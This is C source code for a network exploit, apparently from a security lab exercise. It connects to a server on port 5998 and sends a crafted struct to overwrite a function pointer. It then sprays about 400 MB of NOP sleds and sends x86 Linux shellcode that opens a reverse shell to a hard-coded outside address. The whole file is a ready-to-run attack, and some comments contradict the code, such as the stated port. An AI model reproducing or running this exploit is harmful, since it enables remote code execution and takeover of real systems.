#include <stdio.h>
#include <sys/types.h>  
#include <sys/socket.h>  
#include <netinet/in.h>  
#include <arpa/inet.h>  
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	//./exploit 10.0.106.246 9999
	//argc = 3 
	int sockfd = 0;
	char recv_buf[1024];
	struct sockaddr_in serv_addr;
		
	if(argc != 3) {
		printf ("Usage: %s IP <string>\n", argv[0]);
		return 1;
	}
	
	memset (recv_buf, '0', sizeof(recv_buf));//set recv_buf to 0
	
	//If socket create failed, print the error information
	if ((sockfd = socket (AF_INET, SOCK_STREAM, 0))<0) { 
		printf("\n Error: Could not create socket \n");
		return 1;
	}
	memset (&serv_addr, '0', sizeof(serv_addr));//Set serv_addr to 0
	
	serv_addr.sin_family = AF_INET;//Set protocol to IPv4
	serv_addr.sin_port = htons (5998);//Set port to 5005
	
	//Convert string of IP address to binary; print error info if failed
	if (inet_pton (AF_INET, argv[1], &serv_addr.sin_addr) <= 0) {
		printf ("\n inet_pton error occured\n");
		return 1;
	}
	
	//Request a connection to server; print error info if failed
	if(connect(sockfd, (struct sockaddr *) &serv_addr, sizeof (serv_addr))<0) {
		printf ("\n Error: Connect Failed\n");
		return 1;
	}
	
	char *str = argv[2];
	struct {
		unsigned nbytes;
		unsigned payload_addr;
	}v;
	
	v.nbytes = 4096*1000*100;//Set size of data to be received as 400Mb 
	v. payload_addr = 0xf0000000;//Use v.payload_addr to rewrite function pointer s.fp
	write (sockfd, &v, sizeof (v));//Send v to server and overwrite s.fp
	read(sockfd, recv_buf, sizeof (recv_buf) - 1);
	puts(recv_buf);
	
	char payload_buf [4096];
	memset(payload_buf, 0, sizeof(payload_buf));
	strcpy(payload_buf, str);
	write (sockfd, payload_buf, 4096);
	memset(payload_buf, 0x90, sizeof (payload_buf));//0x90 stands for NOP instruction
	//Send the NOPs 4096*(100*1000-1) bytes
	size_t i;
	for (i = 1; i < 100*1000 - 1; i ++) {
		write (sockfd, payload_buf, 4096);
	}
	
	//Send the malicious shell code (payload)
	unsigned char shell_code[4096] = 
	"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
	"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x11\x0f\x01\x68"
	"\x02\x00\x27\x0e\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
	"\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
	"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
   	write (sockfd, shell_code, 4096);
   	 
	read (sockfd, recv_buf, sizeof (recv_buf) - 1);
   	puts (recv_buf);
	return 0;
}
